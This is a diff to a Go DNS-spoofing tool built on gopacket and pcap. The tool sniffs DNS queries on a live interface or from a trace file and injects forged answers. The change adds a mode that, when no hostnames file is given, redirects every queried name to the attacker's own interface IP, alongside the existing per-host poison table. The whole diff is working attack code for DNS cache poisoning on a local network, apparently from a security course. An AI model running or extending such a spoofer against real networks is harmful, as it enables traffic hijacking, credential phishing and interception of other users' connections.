@@ -16,8 +16,10 @@ import (
 
 func main() {
 
-	var iface, fileName, pattern string
+	var iface, fileName, traceFileName, pattern string
 	var actualBpfFilter string
+	var defaultAttackerIP net.IP = nil
+	var redirectAllPkts bool
 
 	var poisonHostsTable map[string]string
 
@@ -28,15 +30,18 @@ func main() {
 			iface = os.Args[i+1]
 			fmt.Println("Interface specified by user: ", iface)
 		} else if v == "-r" && iface == "" {
+			traceFileName = os.Args[i+1]
+			fmt.Println("FileName to read packets from: ", traceFileName)
+		} else if v == "-f" {
 			fileName = os.Args[i+1]
-			fmt.Println("FileName to read packets from: ", fileName)
+			fmt.Println("Hostnames file: ", fileName)
 		} else if v == "-s" {
 			pattern = os.Args[i+1]
 			fmt.Println("Pattern specified by user: ", pattern)
-		} else if i==1 && os.Args[i] != "-r" && os.Args[i] != "-i" && os.Args[i] != "-s" {
+		} else if i==1 && os.Args[i] != "-r" && os.Args[i] != "-i" && os.Args[i] != "-f" && os.Args[i] != "-s" {
 			actualBpfFilter = os.Args[i]
 			fmt.Println("BPF filter specified by user: ", actualBpfFilter)
-		} else if i > 0 && os.Args[i-1] != "-r" && os.Args[i-1] != "-i" && os.Args[i-1] != "-s" {
+		} else if i > 0 && os.Args[i-1] != "-r" && os.Args[i-1] != "-i" && os.Args[i-1] != "-f" && os.Args[i-1] != "-s" {
 			actualBpfFilter = os.Args[i]
 			fmt.Println("BPF filter specified by user: ", actualBpfFilter)
 		}
@@ -72,6 +77,9 @@ func main() {
 		if err := scanner.Err(); err != nil {
 			fmt.Println(err)
 		}
+		redirectAllPkts = false
+	} else {
+		redirectAllPkts = true
 	}
 
 
@@ -80,16 +88,15 @@ func main() {
 	var currDevice pcap.Interface
 	var handle *pcap.Handle
 
+	var err interface{}
 	
 	// Open device
 	// handle, err = pcap.OpenLive(currDevice.Name, snapshot_len, promiscuous, timeout)
-	if fileName != "" {
-		fmt.Println("Opening file: ", fileName)
-		handle, err = pcap.OpenOffline(fileName)
+	if traceFileName != "" {
+		fmt.Println("Opening file: ", traceFileName)
+		handle, err = pcap.OpenOffline(traceFileName)
 	} else {
-		fmt.Println("Opening live connection on interface: ", currDevice.Name)
-		handle, err = pcap.OpenLive(currDevice.Name, 1024, true, 30)
-
+		
 		devices, err := pcap.FindAllDevs()
 		if err != nil {
 			log.Fatal(err)
@@ -105,6 +112,12 @@ func main() {
 				break
 			}
 		}
+
+		fmt.Println("Opening live connection on interface: ", currDevice.Name)
+		handle, err = pcap.OpenLive(currDevice.Name, 1024, true, 30)
+
+		fmt.Println("currDevice.Addresses: ", currDevice.Addresses)
+		defaultAttackerIP = currDevice.Addresses[0].IP
 
 	}
 
@@ -130,13 +143,13 @@ func main() {
 	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())
 	for packet := range packetSource.Packets() {
 		fmt.Println("!!!! New packet received !!!!")
-		dns_spoof(handle, packet, poisonHostsTable)
+		dns_spoof(handle, packet, poisonHostsTable, redirectAllPkts, defaultAttackerIP)
 	}
 
 }
 
 
-func dns_spoof(handle *pcap.Handle, packet gopacket.Packet, poisonHostsTable map[string]string) {
+func dns_spoof(handle *pcap.Handle, packet gopacket.Packet, poisonHostsTable map[string]string, redirectAllPkts bool, defaultAttackerIP net.IP) {
 
 	var srcMacAddr, destMacAddr net.HardwareAddr
 	var etherType layers.EthernetType
@@ -192,7 +205,32 @@ func dns_spoof(handle *pcap.Handle, packet gopacket.Packet, poisonHostsTable map
 
 				var answerRecord layers.DNSResourceRecord
 
-				if attackerIp, ok := poisonHostsTable[website];  ok {
+				if redirectAllPkts {
+					writePacket = true
+					// spoofedIp := net.ParseIP(defaultAttackerIP
+					// fmt.Print("Spoofed IP: ", spoofedIp)
+					answerRecord.IP = defaultAttackerIP
+					dns.ANCount += 1
+					answerRecord.Type = layers.DNSTypeA
+					// answerRecord.Name = []byte(dnsQuestion.Name)
+					answerRecord.Name = dnsQuestion.Name
+					answerRecord.Class = layers.DNSClassIN
+					dns.QR = true
+					// dns.OpCode = layers.DNSOpCodeNotify
+					// dns.AA = true
+					dns.Answers = append(dns.Answers, answerRecord)
+					dns.ResponseCode = layers.DNSResponseCodeNoErr
+					if dns.ANCount > 0 {
+						for _, dnsAnswer := range dns.Answers {
+							// fmt.Println("All DNS Answers: ", dnsAnswer.String())
+							// d.DnsAnswerTTL = append(d.DnsAnswerTTL, fmt.Sprint(dnsAnswer.TTL))
+							if dnsAnswer.IP.String() != "<nil>" {
+								// fmt.Println("    DNS Answer: ", dnsAnswer.IP.String())
+								// d.DnsAnswer = append(d.DnsAnswer, dnsAnswer.IP.String())
+							}
+						}
+					}
+				} else if attackerIp, ok := poisonHostsTable[website];  ok {
 					writePacket = true
 					spoofedIp := net.ParseIP(attackerIp)
 					fmt.Print("Spoofed IP: ", spoofedIp)
